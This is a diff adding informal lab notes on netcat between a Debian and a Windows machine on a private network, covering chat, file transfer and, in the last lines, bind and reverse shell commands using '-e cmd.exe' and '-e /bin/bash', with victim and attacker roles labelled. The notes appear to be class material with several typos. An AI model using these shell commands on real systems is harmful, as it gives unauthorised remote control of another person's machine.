@@ -1,0 +1,20 @@
+apt-gete install netcat
+sudo netcat -lvvp 4444- to open port in debian1 
+nc -vv 192.168.100.105(deb1 ip) 4444 - to open port in windows
+(the connection is now established between debian and windows and can exchange only messages)
+
+
+
+To establish connection between debian and windows and exchange contents of file-
+nc -lvp 4444 > output.txt  -listen to port 444 and send whatever is coming to output.txt   - on debian
+echo "good morning pune" > input.txt -on windows
+
+
+nc -lvvp 4444 -e cmd.exe- in windows -> open command prompt of my(windows), whoevr is entering into port 4444.
+nc -vv 192.168.100.106 4444 - in debian  ->enter into port 4444  port on window's ip to open cmd.exe(command prompt) of windows (since we put windows's Ip,
+windows's ip will open)
+
+
+nc -v 192.168.100.106 4444 -e /bin/bash -in debian -> whoever entering to port 4444, open /bin/bash (shell) of debian.- victim
+nc -lvvp 4444 - windows ->enter into port 4444 -Windows- Attacker    (since who get the shell is attacker and who's shell has been attacked is victim.)
+afer entering getting shell, put ip a and whoami (shuhari should be there).
